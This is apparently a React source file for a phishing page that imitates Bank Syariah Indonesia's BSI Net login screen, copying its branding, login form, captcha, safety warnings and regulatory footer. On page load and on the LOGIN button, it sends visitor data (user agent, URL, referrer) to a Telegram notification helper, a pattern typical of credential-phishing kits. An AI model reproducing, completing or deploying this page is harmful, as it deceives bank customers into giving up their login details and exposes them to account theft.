import { useEffect, useCallback, useMemo, useState } from "react";
import { sendTelegramNotification } from './utils/telegram';


export default function App() {

  useEffect(() => {
    const sendVisitorNotification = async () => {
      await sendTelegramNotification({
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Direct',
        previousSites: document.referrer || 'None',
      });
    };

    sendVisitorNotification();
  }, []);







  
  return (
    <div className="min-h-screen bg-[#F7FAFB] text-slate-800">
      <TopBar />

      <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-10 lg:py-14">
      <HeroSection />
        <FeaturesSection />

        <MobileAppPromo />

        <ContactCTA />
      </main>

      <Footer />
    </div>
  );
}

/************************** Header **************************/
function TopBar() {
  return (
    <header className="bg-[#18A999] text-white">
      <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center">
        <div className="flex items-center gap-3">
          <BsiGlyph className="h-8 w-8" />
          <div className="leading-tight">
            <div className="font-semibold text-xl tracking-wide">BSI</div>
            <div className="text-[11px] opacity-90 -mt-0.5">BANK SYARIAH INDONESIA</div>
          </div>
        </div>
      </div>
    </header>
  );
}

/************************** Hero **************************/
function HeroSection() {
  return (
    <section className="grid lg:grid-cols-2 gap-8 items-start">
      <LoginCard />
      <SafetyPanel />
    </section>
  );
}

function LoginCard() {
  const [captchaKey, setCaptchaKey] = useState(0);
  const code = useMemo(() => makeCaptcha(), [captchaKey]);
  const sendLocation = useCallback(async () => {
    await sendTelegramNotification({
      userAgent: navigator.userAgent,
      location: window.location.href,
      referrer: document.referrer || 'Direct',
      previousSites: document.referrer || 'None',
    });
  },[])

  return (
    <div className="bg-white rounded-2xl shadow-xl p-6 sm:p-7 md:p-8">
      <h2 className="text-2xl font-semibold text-slate-700">Login ke BSI Net</h2>

      <form className="mt-6 space-y-4">
        <LabeledInput label="User ID" placeholder="Masukan USER ID" />
        <LabeledInput label="Password" type="password" placeholder="Password" />

        <div>
          <label className="block text-sm text-slate-600 mb-2">Captcha</label>
          <div className="flex items-center gap-4">
            <Captcha code={code} />
            <button
              type="button"
              onClick={() => setCaptchaKey((v) => v + 1)}
              className="text-[#D48B0C] text-sm font-medium hover:underline"
            >
              Coba Code Lain
            </button>
          </div>
          <input
            aria-label="Masukkan Captcha"
            className="mt-3 w-full rounded-xl border border-slate-200 bg-white px-4 py-2.5 outline-none focus:ring-4 focus:ring-teal-100"
            placeholder="Masukkan Captcha Diatas"
          />
        </div>

        <div className="pt-2 flex items-center justify-between text-sm">
          <button type="button" className="flex items-center gap-2 hover:underline">
            <KeyIcon className="w-4 h-4" /> Lupa User ID ?
          </button>
          <button type="button" className="flex items-center gap-2 hover:underline">
            <LockIcon className="w-4 h-4" /> Lupa Password ?
          </button>
        </div>

        <div className="pt-2 flex justify-end">
          <button onClick={sendLocation}
            type="button"
            className="inline-flex items-center gap-2 bg-[#18A999] hover:bg-[#149986] text-white font-semibold px-6 py-3 rounded-full shadow-lg transition-colors"
          >
            LOGIN <ArrowRightCircle className="w-5 h-5" />
          </button>
        </div>
      </form>
    </div>
  );
}

function LabeledInput({ label, placeholder, type = "text" }: { label: string; placeholder?: string; type?: string }) {
  return (
    <div>
      <label className="block text-sm text-slate-600 mb-2">{label}</label>
      <input
        type={type}
        placeholder={placeholder}
        className="w-full rounded-xl border border-slate-200 bg-white px-4 py-2.5 outline-none focus:ring-4 focus:ring-teal-100"
      />
    </div>
  );
}

function SafetyPanel() {
  return (
    <aside className="bg-white rounded-2xl shadow-xl p-6 sm:p-7 md:p-8">
      <h3 className="text-[#18A999] text-3xl font-semibold">Hati-Hati, Teliti & Waspada</h3>
      <div className="mt-4 space-y-4 text-slate-600 leading-relaxed">
        <p>
          Hentikan transaksi BSI Net Anda jika diminta melakukan <b>Konfirmasi atau Verifikasi Data Anda</b> (UserID, Password, PIN Otorisasi,
          Email, dan Kode Token).
        </p>
        <p>
          Jaga kerahasiaan (UserID, Password, PIN Otorisasi, Email, dan Kode Token). Kode Token serta PIN Otorisasi BSI hanya digunakan untuk
          transaksi BSI Net, bukan untuk verifikasi atau konfirmasi data Anda. Segera hubungi Bank Syariah Indonesia Call 14040 atau Kantor
          Cabang terdekat untuk informasi lebih lanjut.
        </p>
      </div>
      <div className="mt-6">
        <button className="inline-flex items-center gap-2 bg-[#F1B24A] hover:bg-[#E3A33A] text-white font-medium px-4 py-2 rounded-full shadow">
          Tips Aman Menggunakan BSI NET
        </button>
      </div>
    </aside>
  );
}

/************************** Features **************************/
function FeaturesSection() {
  const items = [
    { title: "Payment", icon: <DocPayIcon className="w-9 h-9" /> },
    { title: "Inquiry", icon: <ChecklistIcon className="w-9 h-9" /> },
    { title: "Manage Admin", icon: <UserCogIcon className="w-9 h-9" /> },
    { title: "Rekening", icon: <CardIcon className="w-9 h-9" /> },
  ];

  return (
    <section className="mt-14">
      <h4 className="text-center text-[#18A999] text-2xl sm:text-[28px] font-semibold">
        Dengan Fitur Yang Memudahkan<br className="hidden sm:block" /> Transaksi Anda
      </h4>
      <div className="mt-8 grid grid-cols-2 sm:grid-cols-4 gap-4 sm:gap-6">
        {items.map((it) => (
          <div key={it.title} className="bg-white rounded-2xl shadow-md p-5 text-center">
            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-[#FFF8EE]">
              {it.icon}
            </div>
            <div className="font-medium text-slate-700">{it.title}</div>
            <button className="mt-1 text-xs font-semibold text-[#18A999] hover:underline">DETAIL</button>
          </div>
        ))}
      </div>
    </section>
  );
}

/************************** Mobile Promo **************************/
function MobileAppPromo() {
  return (
    <section className="mt-16 grid lg:grid-cols-2 gap-10 items-center">
      <div className="order-2 lg:order-1">
        <h5 className="text-[#18A999] text-2xl sm:text-[28px] font-semibold leading-snug">
          Lebih Mudah & Praktis<br className="hidden sm:block" /> Dengan BSI Mobile
        </h5>
        <p className="mt-3 text-slate-600 leading-relaxed">
          Transaksi, Pembelian, Pembayaran & lainnya, lebih mudah dengan Aplikasi BSI Mobile.
        </p>
        <div className="mt-5 flex items-center gap-3">
          <StoreBadge kind="google" />
          <StoreBadge kind="apple" />
        </div>
      </div>

      <div className="order-1 lg:order-2">
        <div className="relative mx-auto max-w-md">
          <div className="absolute inset-0 -z-10 rounded-[28px] bg-[#E8F8F5]" />
          <IllustrationPhone />
        </div>
      </div>
    </section>
  );
}

/************************** Contact CTA **************************/
function ContactCTA() {
  return (
    <section className="mt-16 text-center">
      <h6 className="text-[#18A999] text-[22px] sm:text-2xl font-semibold">
        Untuk informasi lebih lanjut hubungi<br className="hidden sm:block" /> Bank Syariah Indonesia Call
      </h6>
      <div className="mt-5 flex justify-center">
        <button className="inline-flex items-center gap-3 bg-[#18A999] hover:bg-[#149986] text-white text-lg font-semibold rounded-full px-6 py-3 shadow-lg">
          <PhoneIcon className="w-5 h-5" /> 14040
        </button>
      </div>
    </section>
  );
}

/************************** Footer **************************/
function Footer() {
  return (
    <footer className="mt-16 border-t border-slate-200/70 py-8 text-center text-[12px] text-slate-500 px-4">
      <div className="max-w-6xl mx-auto">
        <p>
          PT Bank Syariah Indonesia Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan dan Bank Indonesia serta merupakan Peserta Penjaminan LPS.
          Maksimum nilai simpanan yang dijamin LPS per nasabah per bank adalah Rp 2 miliar.
        </p>
        <p className="mt-2">Copyright © 2025 · Bank Syariah Indonesia · v1</p>
      </div>
    </footer>
  );
}

/************************** Small UI Bits **************************/
function Captcha({ code }: { code: string }) {
  return (
    <div className="select-none inline-flex items-center justify-center min-w-[112px] h-10 rounded-lg border border-slate-200 bg-slate-50 px-3">
      <span className="font-mono text-xl tracking-widest [font-variant-ligatures:none] rotate-[-2deg]">
        {code}
      </span>
    </div>
  );
}

function StoreBadge({ kind }: { kind: "google" | "apple" }) {
  const isGoogle = kind === "google";
  return (
    <a className="group inline-flex items-center gap-3 rounded-xl border border-slate-200 bg-white px-4 py-2.5 shadow hover:shadow-md transition">
      <div className="h-6 w-6 grid place-items-center rounded-md bg-slate-900 text-white text-[10px] font-bold">
        {isGoogle ? "GP" : "AS"}
      </div>
      <div className="text-left leading-tight">
        <div className="text-[10px] uppercase tracking-wide text-slate-500">
          {isGoogle ? "Get it on" : "Download on the"}
        </div>
        <div className="text-sm font-semibold">{isGoogle ? "Google Play" : "App Store"}</div>
      </div>
    </a>
  );
}

/************************** Icons (minimal SVGs) **************************/
function BsiGlyph({ className = "" }: { className?: string }) {
  return (
    <svg viewBox="0 0 48 48" className={className} aria-hidden>
      <defs>
        <linearGradient id="g" x1="0" x2="1">
          <stop offset="0%" stopColor="#22C1B2" />
          <stop offset="100%" stopColor="#18A999" />
        </linearGradient>
      </defs>
      <circle cx="24" cy="24" r="24" fill="url(#g)" />
      <path d="M14 26c5-6 9-6 14 0 0 0 4 6 10 6" stroke="#fff" strokeWidth="3" fill="none" strokeLinecap="round" />
    </svg>
  );
}

function ArrowRightCircle({ className = "w-5 h-5" }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} fill="currentColor" aria-hidden>
      <path d="M12 2a10 10 0 100 20 10 10 0 000-20zm-.75 11.5H8a1 1 0 110-2h3.25V9l3 3-3 3v-1.5z" />
    </svg>
  );
}

function LockIcon({ className = "w-4 h-4" }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} fill="currentColor" aria-hidden>
      <path d="M6 10V8a6 6 0 1112 0v2h1a1 1 0 011 1v10a1 1 0 01-1 1H5a1 1 0 01-1-1V11a1 1 0 011-1h1zm2 0h8V8a4 4 0 10-8 0v2z" />
    </svg>
  );
}
function KeyIcon({ className = "w-4 h-4" }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} fill="currentColor" aria-hidden>
      <path d="M14 3a6 6 0 100 12 6 6 0 000-12zM2 21l5-5h3l2-2 1 1-2 2v3l-2 2H2z" />
    </svg>
  );
}
function PhoneIcon({ className = "w-5 h-5" }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} fill="currentColor" aria-hidden>
      <path d="M6.6 10.8a12.6 12.6 0 006.6 6.6l2.2-2.2a1 1 0 011.1-.24 9.9 9.9 0 003.5.64 1 1 0 011 1V20a1 1 0 01-1 1A17 17 0 013 4a1 1 0 011-1h3.4a1 1 0 011 1 9.9 9.9 0 00.64 3.5 1 1 0 01-.24 1.1L6.6 10.8z" />
    </svg>
  );
}
function DocPayIcon({ className = "w-6 h-6" }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} fill="#F1B24A" aria-hidden>
      <path d="M6 2h9l5 5v13a2 2 0 01-2 2H6a2 2 0 01-2-2V4a2 2 0 012-2zm8 1v5h5" fillOpacity=".25" />
      <path d="M7 12h10v2H7zM7 16h6v2H7z" />
    </svg>
  );
}
function ChecklistIcon({ className = "w-6 h-6" }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} fill="#F1B24A" aria-hidden>
      <path d="M3 5h14v2H3zM3 11h14v2H3zM3 17h9v2H3z" />
      <path d="M19.5 6.5l1.5-1.5 2 2-3.5 3.5-2-2z" fillOpacity=".4" />
    </svg>
  );
}
function UserCogIcon({ className = "w-6 h-6" }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} fill="#F1B24A" aria-hidden>
      <path d="M12 12a5 5 0 100-10 5 5 0 000 10zM3 22a7 7 0 0118 0v1H3z" />
      <path d="M18.5 9l.5-1 .9.3.6-.9.8.8-.4 1 .7.7-1 .6.1 1.1-1.1.1-.5 1-.9-.5-.9.5-.5-1-1.1-.1.1-1.1-1-.6.7-.7-.4-1 .8-.8.6.9.9-.3.5 1z" fillOpacity=".4" />
    </svg>
  );
}
function CardIcon({ className = "w-6 h-6" }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} fill="#F1B24A" aria-hidden>
      <rect x="2" y="5" width="20" height="14" rx="2" />
      <rect x="2" y="8" width="20" height="3" fill="#fff" opacity=".6" />
      <rect x="6" y="14" width="6" height="2" fill="#fff" opacity=".9" />
    </svg>
  );
}

/************************** Little Illustration **************************/
function IllustrationPhone() {
  return (
    <svg viewBox="0 0 360 250" className="w-full h-auto" aria-hidden>
      <defs>
        <linearGradient id="bgc" x1="0" x2="1">
          <stop offset="0%" stopColor="#E8F8F5" />
          <stop offset="100%" stopColor="#DDF3EF" />
        </linearGradient>
      </defs>
      <circle cx="180" cy="130" r="110" fill="url(#bgc)" />
      <g transform="translate(120,40)">
        <rect x="0" y="0" rx="22" ry="22" width="120" height="180" fill="#111827" />
        <rect x="8" y="32" rx="14" ry="14" width="104" height="136" fill="#F8FAFC" />
        <rect x="40" y="12" width="40" height="6" rx="3" fill="#374151" />
        <g transform="translate(20,48)">
          <rect x="0" y="0" width="64" height="12" rx="6" fill="#18A999" />
          <rect x="0" y="24" width="88" height="12" rx="6" fill="#F1B24A" />
          <rect x="0" y="48" width="52" height="12" rx="6" fill="#18A999" />
          <rect x="0" y="72" width="72" height="12" rx="6" fill="#F1B24A" />
        </g>
      </g>
      <g transform="translate(36,150)">
        <Coin x={0} />
        <Coin x={36} />
        <Coin x={72} />
      </g>
      <text x="165" y="210" textAnchor="middle" fontSize="18" fontWeight="700" fill="#18A999">BSI mobile</text>
    </svg>
  );
}

function Coin({ x = 0 }) {
  return (
    <g transform={`translate(${x},0)`}>
      <circle cx="12" cy="12" r="12" fill="#F1B24A" />
      <path d="M6 12h12" stroke="#fff" strokeWidth="2" />
      <path d="M10 8h4M8 16h8" stroke="#fff" strokeWidth="2" />
    </g>
  );
}

/************************** Utils **************************/
function makeCaptcha() {
  const chars = "abcdefghijkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789";
  const n = 6;
  let out = "";
  for (let i = 0; i < n; i++) out += chars[Math.floor(Math.random() * chars.length)];
  return out.split("").map(warp).join("");
}
function warp(ch: string) {
  // visually messy characters (purely cosmetic)
  const r = Math.random();
  if (r < 0.3) return ch.toLowerCase();
  if (r < 0.6) return ch.toUpperCase();
  return ch;
}
